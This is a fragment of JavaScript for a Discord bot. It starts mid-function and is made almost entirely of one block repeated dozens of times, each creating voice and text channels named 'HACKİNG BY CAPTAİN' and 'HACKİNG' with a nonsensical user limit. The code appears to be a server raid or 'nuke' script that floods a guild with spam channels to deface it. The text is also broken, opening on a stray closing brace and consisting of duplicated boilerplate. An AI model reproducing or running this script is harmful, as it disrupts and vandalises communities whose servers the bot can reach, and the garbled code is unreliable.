    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
